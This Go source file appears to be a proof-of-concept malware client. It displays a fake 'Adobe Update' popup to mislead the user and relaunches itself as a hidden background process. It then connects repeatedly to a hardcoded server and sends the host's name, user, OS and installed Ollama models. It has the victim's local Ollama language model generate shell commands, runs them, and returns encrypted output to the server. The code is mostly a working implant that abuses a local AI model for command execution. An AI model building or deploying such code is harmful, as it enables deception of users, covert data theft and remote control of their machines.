package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"golang.org/x/text/encoding/charmap"
)

const (
	SERVER_ADDR      = "192.168.56.1:9000"
	daemonFlag       = "-daemon"
	LOCK_PORT        = 39871
	CMD_TIMEOUT      = 30 * time.Second
	OLLAMA_API_URL   = "http://localhost:11434/api/chat"
	MODEL_CMD_PREFIX = "!MODEL "
)

var lockListener net.Listener

var windowsPrompts = []string{
	"Generate a single Windows command line for getting the network interfaces information.",
	"Generate a single Windows command line for printing the message 'PWNED'",
}

var linuxPrompts = []string{
	"Generate a single Linux command line for getting the network interfaces information.",
	"Generate a single Linux command line for printing the message 'PWNED'",
}

func main() {
	if !isDaemon() {
		showFakeUpdate()
		launchDaemon()
		return
	}
	if err := acquireLock(); err != nil {
		return
	}
	defer releaseLock()
	runClient()
}

func isDaemon() bool {
	for _, arg := range os.Args {
		if arg == daemonFlag {
			return true
		}
	}
	return false
}

func acquireLock() error {
	var err error
	lockListener, err = net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", LOCK_PORT))
	return err
}

func releaseLock() {
	if lockListener != nil {
		lockListener.Close()
	}
}

func showFakeUpdate() {
	switch runtime.GOOS {
	case "windows":
		vbs := `Set WshShell = CreateObject("WScript.Shell")
WshShell.Popup "Checking for updates...", 3, "Adobe Update", 64
WScript.Sleep 3000
WshShell.Popup "Installing update...", 3, "Adobe Update", 64`
		tmpFile := filepath.Join(os.TempDir(), "update.vbs")
		os.WriteFile(tmpFile, []byte(vbs), 0644)
		cmd := exec.Command("wscript", tmpFile)
		setSysProcAttrForFakeUpdate(cmd)
		cmd.Start()
		go func() {
			time.Sleep(6 * time.Second)
			os.Remove(tmpFile)
		}()
	case "linux":
		if _, err := exec.LookPath("zenity"); err == nil {
			exec.Command("zenity", "--info", "--text=Checking for updates...", "--title=Adobe Update", "--timeout=3").Run()
			exec.Command("zenity", "--info", "--text=Installing update...", "--title=Adobe Update", "--timeout=2").Run()
		} else {
			fmt.Println("Checking for updates...")
			time.Sleep(3 * time.Second)
			fmt.Println("Installing update...")
			time.Sleep(2 * time.Second)
		}
	default:
		fmt.Println("Checking for updates...")
		time.Sleep(3 * time.Second)
		fmt.Println("Installing update...")
		time.Sleep(2 * time.Second)
	}
}

func launchDaemon() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	cmd := exec.Command(exe, daemonFlag)
	setSysProcAttrForDaemon(cmd)
	cmd.Start()
}

func executeCommand(cmdStr string) string {
	ctx, cancel := context.WithTimeout(context.Background(), CMD_TIMEOUT)
	defer cancel()

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		tmpFile, err := os.CreateTemp("", "cmd_*.bat")
		if err != nil {
			return fmt.Sprintf("Error creating temp file: %v", err)
		}
		defer os.Remove(tmpFile.Name())

		if _, err := tmpFile.WriteString("@echo off\r\n" + cmdStr + "\r\n"); err != nil {
			return fmt.Sprintf("Error writing temp file: %v", err)
		}
		tmpFile.Close()

		cmd = exec.CommandContext(ctx, "cmd", "/C", tmpFile.Name())
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", cmdStr)
	}
	setSysProcAttrForExec(cmd)

	rawOutput, err := cmd.CombinedOutput()
	if err != nil {
		errMsg := fmt.Sprintf("Error executing command: %v\n", err)
		if runtime.GOOS == "windows" {
			decoded, decErr := charmap.CodePage850.NewDecoder().Bytes(rawOutput)
			if decErr == nil {
				return errMsg + string(decoded)
			}
		}
		return errMsg + string(rawOutput)
	}
	if runtime.GOOS == "windows" {
		decoded, err := charmap.CodePage850.NewDecoder().Bytes(rawOutput)
		if err == nil {
			return string(decoded)
		}
	}
	return string(rawOutput)
}

type OllamaChatRequest struct {
	Model    string `json:"model"`
	Messages []struct {
		Role    string `json:"role"`
		Content string `json:"content"`
	} `json:"messages"`
	Stream  bool                   `json:"stream"`
	Options map[string]interface{} `json:"options,omitempty"`
}

type OllamaChatResponse struct {
	Message struct {
		Content string `json:"content"`
	} `json:"message"`
	Error string `json:"error,omitempty"`
}

type CommandResult struct {
	Prompt  string `json:"prompt"`
	Command string `json:"command"`
	Output  string `json:"output"`
}

func getAvailableModels() ([]string, error) {
	cmd := exec.Command("ollama", "list")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("ollama list failed: %v", err)
	}
	lines := strings.Split(string(output), "\n")
	var models []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "NAME") {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) >= 1 {
			models = append(models, fields[0])
		}
	}
	return models, nil
}

func getStoredModel() string {
	path := modelFilePath()
	if data, err := os.ReadFile(path); err == nil {
		model := strings.TrimSpace(string(data))
		if model != "" {
			return model
		}
	}
	models, err := getAvailableModels()
	if err != nil || len(models) == 0 {
		return ""
	}
	return models[0]
}

func storeModel(model string) {
	path := modelFilePath()
	os.MkdirAll(filepath.Dir(path), 0700)
	os.WriteFile(path, []byte(model), 0600)
}

func modelFilePath() string {
	if configDir, err := os.UserConfigDir(); err == nil && configDir != "" {
		return filepath.Join(configDir, "tcpclient", "current_model")
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		return filepath.Join(home, ".tcpclient_current_model")
	}
	return ".current_model"
}

func queryOllama(prompt string, model string) (string, error) {
	reqBody := OllamaChatRequest{
		Model: model,
		Messages: []struct {
			Role    string `json:"role"`
			Content string `json:"content"`
		}{
			{Role: "system", Content: "You are a precise command-line assistant. Output ONLY the raw command line, without any markdown formatting, backticks, quotes, or explanations. The command must be a single line valid for the target operating system indicated by the user."},
			{Role: "user", Content: prompt},
		},
		Stream:  false,
		Options: map[string]interface{}{"temperature": 1.0},
	}
	data, err := json.Marshal(reqBody)
	if err != nil {
		return "", err
	}
	client := &http.Client{Timeout: 120 * time.Second}
	req, err := http.NewRequest(http.MethodPost, OLLAMA_API_URL, bytes.NewBuffer(data))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return "", fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(body))
	}
	var out OllamaChatResponse
	if err := json.Unmarshal(body, &out); err != nil {
		return "", err
	}
	if out.Error != "" {
		return "", fmt.Errorf("Ollama error: %s", out.Error)
	}
	return strings.TrimSpace(out.Message.Content), nil
}

func runClient() {
	for {
		conn, err := net.Dial("tcp", SERVER_ADDR)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		scanner := bufio.NewScanner(conn)
		writer := bufio.NewWriter(conn)
		sessionKey, err := performHandshake(conn, scanner)
		if err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}
		currentModel := getStoredModel()
		executePredefinedPrompts(conn, writer, sessionKey, currentModel)

		for scanner.Scan() {
			line := scanner.Text()
			var cmdJSON struct {
				Sig    string `json:"sig"`
				Cipher string `json:"cipher"`
			}
			if err := json.Unmarshal([]byte(line), &cmdJSON); err != nil {
				continue
			}
			sig, _ := base64.StdEncoding.DecodeString(cmdJSON.Sig)
			payload, _ := base64.StdEncoding.DecodeString(cmdJSON.Cipher)
			if err := verifySignature(payload, sig); err != nil {
				continue
			}
			nonce := payload[:12]
			ciphertextTag := payload[12:]
			block, _ := aes.NewCipher(sessionKey)
			aesgcm, _ := cipher.NewGCM(block)
			plaintext, err := aesgcm.Open(nil, nonce, ciphertextTag, nil)
			if err != nil {
				continue
			}
			prompt := string(plaintext)

			if strings.HasPrefix(prompt, MODEL_CMD_PREFIX) {
				newModel := strings.TrimPrefix(prompt, MODEL_CMD_PREFIX)
				newModel = strings.TrimSpace(newModel)
				if newModel != "" {
					storeModel(newModel)
					currentModel = newModel
					result := CommandResult{
						Prompt:  prompt,
						Command: "ollama model set",
						Output:  fmt.Sprintf("Model changed to %s", newModel),
					}
					jsonResult, _ := json.Marshal(result)
					encOutput := encryptOutput(sessionKey, string(jsonResult))
					fmt.Fprintln(writer, encOutput)
					writer.Flush()

					executePredefinedPrompts(conn, writer, sessionKey, currentModel)
				}
			}
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func executePredefinedPrompts(conn net.Conn, writer *bufio.Writer, sessionKey []byte, model string) {
	var prompts []string
	switch runtime.GOOS {
	case "windows":
		prompts = windowsPrompts
	case "linux":
		prompts = linuxPrompts
	default:
		return
	}

	for _, prompt := range prompts {
		aiCommand, err := queryOllama(prompt, model)
		if err != nil {
			result := CommandResult{
				Prompt:  prompt,
				Command: "",
				Output:  fmt.Sprintf("Ollama error: %v", err),
			}
			jsonResult, _ := json.Marshal(result)
			encOutput := encryptOutput(sessionKey, string(jsonResult))
			fmt.Fprintln(writer, encOutput)
			writer.Flush()
			continue
		}
		output := executeCommand(aiCommand)
		result := CommandResult{
			Prompt:  prompt,
			Command: aiCommand,
			Output:  output,
		}
		jsonResult, _ := json.Marshal(result)
		encOutput := encryptOutput(sessionKey, string(jsonResult))
		fmt.Fprintln(writer, encOutput)
		writer.Flush()
	}
}

func performHandshake(conn net.Conn, scanner *bufio.Scanner) ([]byte, error) {
	suggestedID := getStoredClientID()
	hostname, _ := os.Hostname()
	if hostname == "" {
		hostname = "unknown"
	}
	username := getUsername()
	osName := runtime.GOOS

	fmt.Fprintln(conn, "[SYSTEM INFO]")
	fmt.Fprintf(conn, "Client ID: %s\n", suggestedID)
	fmt.Fprintf(conn, "OS: %s\n", osName)
	fmt.Fprintf(conn, "Hostname: %s\n", hostname)
	fmt.Fprintf(conn, "User: %s\n", username)
	fmt.Fprintln(conn, "[END SYSTEM INFO]")

	models, _ := getAvailableModels()
	fmt.Fprintln(conn, "[MODELS]")
	for _, m := range models {
		fmt.Fprintln(conn, m)
	}
	fmt.Fprintln(conn, "[END MODELS]")
	currentModel := getStoredModel()
	fmt.Fprintf(conn, "CURRENT_MODEL:%s\n", currentModel)

	sessionKey := make([]byte, 32)
	if _, err := rand.Read(sessionKey); err != nil {
		return nil, err
	}

	serverPubKey, err := parseServerPublicKey()
	if err != nil {
		return nil, err
	}

	encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, serverPubKey, sessionKey)
	if err != nil {
		return nil, err
	}
	encKeyB64 := base64.StdEncoding.EncodeToString(encryptedKey)
	fmt.Fprintf(conn, "SESSION_KEY:%s\n", encKeyB64)

	if !scanner.Scan() {
		return nil, errors.New("no response from server")
	}
	responseLine := strings.TrimSpace(scanner.Text())
	if !strings.HasPrefix(responseLine, "ASSIGNED_ID:") {
		return nil, errors.New("invalid handshake response")
	}
	assignedID := strings.TrimPrefix(responseLine, "ASSIGNED_ID:")
	if assignedID != "" && assignedID != suggestedID {
		storeClientID(assignedID)
	}
	return sessionKey, nil
}

func parseServerPublicKey() (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(serverPublicKeyPEM))
	if block == nil {
		return nil, errors.New("failed to parse public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("not RSA public key")
	}
	return rsaPub, nil
}

func encryptOutput(key []byte, output string) string {
	block, _ := aes.NewCipher(key)
	aesgcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, 12)
	rand.Read(nonce)
	ciphertext := aesgcm.Seal(nil, nonce, []byte(output), nil)
	payload := append(nonce, ciphertext...)
	return base64.StdEncoding.EncodeToString(payload)
}

func verifySignature(payload, sig []byte) error {
	block, _ := pem.Decode([]byte(serverPublicKeyPEM))
	if block == nil {
		return errors.New("failed to parse public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return errors.New("not RSA public key")
	}
	hash := sha256.Sum256(payload)
	return rsa.VerifyPKCS1v15(rsaPub, crypto.SHA256, hash[:], sig)
}

func getStoredClientID() string {
	path := clientIDPath()
	if data, err := os.ReadFile(path); err == nil {
		id := strings.TrimSpace(string(data))
		if id != "" {
			return id
		}
	}
	return ""
}

func storeClientID(id string) {
	path := clientIDPath()
	os.MkdirAll(filepath.Dir(path), 0700)
	os.WriteFile(path, []byte(id), 0600)
}

func clientIDPath() string {
	if configDir, err := os.UserConfigDir(); err == nil && configDir != "" {
		return filepath.Join(configDir, "tcpclient", "client_id")
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		return filepath.Join(home, ".tcpclient_client_id")
	}
	return ".client_id"
}

func getUsername() string {
	if u, err := user.Current(); err == nil && u.Username != "" {
		return u.Username
	}
	if v := os.Getenv("USERNAME"); v != "" {
		return v
	}
	if v := os.Getenv("USER"); v != "" {
		return v
	}
	return "unknown"
}

const serverPublicKeyPEM = `-----BEGIN PUBLIC KEY-----
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXX
-----END PUBLIC KEY-----
`